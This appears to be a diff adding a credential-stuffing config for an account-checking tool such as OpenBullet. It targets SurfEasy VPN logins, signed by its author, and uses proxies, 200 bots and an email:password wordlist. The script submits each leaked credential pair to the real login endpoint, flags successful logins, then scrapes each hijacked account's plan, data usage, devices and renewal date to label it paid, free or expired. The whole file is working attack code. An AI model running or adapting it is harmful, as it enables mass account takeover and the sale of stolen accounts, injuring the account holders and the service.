@@ -1,0 +1,169 @@
+[SETTINGS]
+{
+  "Name": "SURFEASY VPN CONFIG MADE BY 🆈🅾️🆄🆂🆂🅴🅵 🅰️🅷🅼🅴🅳",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-14T15:31:14.6815492-07:00",
+  "AdditionalInfo": "https://www.surfeasy.com/us/en/",
+  "Author": "🆈🅾️🆄🆂🆂🅴🅵 🅰️🅷🅼🅴🅳",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#USERNAME FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PASSWORD FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://accounts.surfeasy.com/login" 
+  CONTENT "email=<US>&password=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,ar;q=0.8" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 57" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "cookie: at_check=true; AMCVS_67C716D751E567F70A490D4C%40AdobeOrg=1; AMCV_67C716D751E567F70A490D4C%40AdobeOrg=359503849%7CMCIDTS%7C19065%7CMCMID%7C84807654063560974252351499723848432910%7CMCAAMLH-1647738909%7C6%7CMCAAMB-1647738909%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1647141310s%7CNONE%7CvVersion%7C5.0.1; mbox=session#b674bdd85d1d4060809bab9ac1f14ebe#1647135972|PC#b674bdd85d1d4060809bab9ac1f14ebe.37_0#1710378912; SYMANTEC_ENSIGHTEN_PRIVACY_BANNER_LOADED=1; event69=event69; s_gpv=surfeasy%3Aus%3Ahome%3Ahome; s_gpv_custom=surfeasy%3Ahome%3Ahome; s_cc=true; _gcl_au=1.1.494704086.1647134113; _fbp=fb.1.1647134113348.1769568609; __fmpix_uid=1-c0q0pu5x-l0ol4ge2; __zlcmid=18ykls3v6Vq8cA0; s_nr=1647134150489-New; s_sq=symanteccom%3D%2526c.%2526a.%2526activitymap.%2526page%253Dsurfeasy%25253Aus%25253Ahome%25253Ahome%2526link%253DLogin%2526region%253Ddesktop-nav%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dsurfeasy%25253Aus%25253Ahome%25253Ahome%2526pidt%253D1%2526oid%253Dhttps%25253A%25252F%25252Faccounts.surfeasy.com%25252Flogin%2526ot%253DA; RT=\"z=1&dm=surfeasy.com&si=ac204c81-ba47-4c1e-9f77-458d7572f336&ss=l0ol3zjx&sl=1&tt=hj2&bcn=%2F%2F684dd325.akstat.io%2F&ld=hjb&nu=32263ek3&cl=18y2&ul=18z8&hd=198g\"; cf_chl_2=ac208acac285d05; cf_chl_prog=x11; cf_clearance=bIIxOeJzAjFwsdsoA5cp8qac4oTWFCV0QuX6hOrzrDY-1647134156-0-150; _proxy_manager_session31=ejRHNVhLQUJnVi9yZHBTNU51dEpVQWE4NEE5b0txRk9RZkJhZkdEMWlucmJrRC9NVHVsZVo3TVh3TjVGZlV6Y3Y5SWw4MXNFcDVGR0xWbTVmbFFKZi9ZbFU3WjdpRFdOT1VBOUJXVHBCNHRJSklnRHNqR1laMGg2UVFJVXlEQjVUUVZNUnVWd0FtK3pCdVdtOU1wSmpRPT0tLUVnNFFXYWcrYlYzMi9SUzU3QzFDTkE9PQ%3D%3D--99070d6cdf4d5d2e444f2f2b09230e5d8f8012ad; _ga=GA1.2.371019805.1647134159; _gid=GA1.2.689478979.1647134159; _dc_gtm_UA-22616710-9=1; __adroll_fpc=c43b19256cc08937c87849cb775bcc94-1647134160461; mp_de900acf60d05b0ab46433c6d8eaf750_mixpanel=%7B%7D; mp_de900acf60d05b0ab46433c6d8eaf750_mixpanel=%7B%22distinct_id%22%3A%20%2217f80d91357e7-04956a3651e336-977173c-140000-17f80d9135824e%22%2C%22%24device_id%22%3A%20%2217f80d91357e7-04956a3651e336-977173c-140000-17f80d9135824e%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Faccounts.surfeasy.com%2Flogin%3F__cf_chl_tk%3DH6ihBdLncxQnCoANKcUx63Q7cMp1YEZExV111eKojck-1647134151-0-gaNycGzNCtE%22%2C%22%24initial_referring_domain%22%3A%20%22accounts.surfeasy.com%22%7D; __ar_v4=ZBC4KFGNYVGXLKW257OLRQ%3A20220312%3A2%7CQMNG47BXZVCDDOIQCTAHTP%3A20220312%3A2%7C22VHW4KUP5DMHHSU4W4S3J%3A20220312%3A2" 
+  HEADER "origin: https://accounts.surfeasy.com" 
+  HEADER "referer: https://accounts.surfeasy.com/login" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Your email and/or password is incorrect" 
+  KEYCHAIN Failure OR 
+    KEY "Your email and/or password is incorrect" 
+
+REQUEST GET "https://accounts.surfeasy.com/" 
+  
+  HEADER "referer: https://accounts.surfeasy.com/login" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<span>Sign Out</span>" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "<span>Sign Out</span>" 
+
+#CUD FUNCTION CurrentUnixTime -> VAR "CUD" 
+
+#FC PARSE "<SOURCE>" LR "<i class=\"fa fa-arrow-circle-o-up\"></i>" "<h1 class=\"card-heading-checkout\"> Plan Details </h1>" -> VAR "FC" 
+
+#Plan_Name PARSE "<SOURCE>" LR "Plan Name" "<hr class=\"hr-style\">" -> VAR "Plan Name1" 
+
+#Plan_Name PARSE "<Plan Name1>" LR "0px;\">" "</p>" CreateEmpty=FALSE -> CAP "Plan Name" 
+
+#Data_Usage PARSE "<SOURCE>" LR "<h1 class=\"card-heading-checkout\"> Data Usage </h1>" "<small> of Data </small>" -> VAR "Data Usage1" 
+
+#Data_Usage PARSE "<Data Usage1>" LR "\"text-primary mb-remaining\"><strong> " " </strong></h2>" CreateEmpty=FALSE -> CAP "Data Usage" 
+
+#Devices PARSE "<SOURCE>" LR "Devices" "<hr class=\"hr-style\">" -> VAR "Devices1" 
+
+#Devices PARSE "<Devices1>" LR "\"p-values\">" "</p>" CreateEmpty=FALSE -> CAP "Connected Devices" 
+
+#Renewal_Date PARSE "<SOURCE>" LR "Renewal Date" "<hr class=\"hr-style\">" -> VAR "Renewal Date1" 
+
+#Renewal_Date PARSE "<Renewal Date1>" LR "\"p-values\">" "</p>" -> VAR "Renewal Date3" 
+
+PARSE "<Renewal Date3>" LR "" " " -> VAR "YOU" 
+
+PARSE "<Renewal Date3>" LR " " "," -> VAR "SEF" 
+
+PARSE "<Renewal Date3>" LR ", " "" -> VAR "AHMED" 
+
+FUNCTION Translate 
+  KEY "January" VALUE "01" 
+  KEY "February" VALUE "02" 
+  KEY "March" VALUE "03" 
+  KEY "April" VALUE "04" 
+  KEY "May" VALUE "05" 
+  KEY "June" VALUE "06" 
+  KEY "July" VALUE "07" 
+  KEY "August" VALUE "08" 
+  KEY "September" VALUE "09" 
+  KEY "October" VALUE "10" 
+  KEY "November" VALUE "11" 
+  KEY "December" VALUE "12" 
+  "<YOU>" -> VAR "YOUSSEF" 
+
+FUNCTION Constant "<SEF>/<YOUSSEF>/<AHMED>" -> CAP "Renewal Date" 
+
+FUNCTION DateToUnixTime "dd/MM/yyyy" "<Renewal Date>" -> VAR "RD" 
+
+#Remaining_Days_(1) FUNCTION Compute "(<RD>-<CUD>)/86400." -> VAR "Remaining Days1" 
+
+#Remaining_Days_(2) PARSE "<Remaining Days1>" LR "" "." CreateEmpty=FALSE -> CAP "Remaining Days" 
+
+#Use_On PARSE "<SOURCE>" LR "Use On" "</p>" -> VAR "Use On1" 
+
+#Use_On PARSE "<Use On1>" LR "\"p-values\">" "" CreateEmpty=FALSE -> CAP "Use On" 
+
+#🅰🆄🆃🅷🅾🆁 FUNCTION Constant "🆈🅾️🆄🆂🆂🅴🅵 🅰️🅷🅼🅴🅳" -> CAP "🅰🆄🆃🅷🅾🆁" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "<FC>" DoesNotContain "Upgrade Now" 
+    KEY "<RD>" GreaterThan "<CUD>" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<FC>" Contains "Upgrade Now" 
+  KEYCHAIN Custom "EXPIRED" AND 
+    KEY "<RD>" LessThan "<CUD>" 
+    KEY "<FC>" DoesNotContain "Upgrade Now" 
+
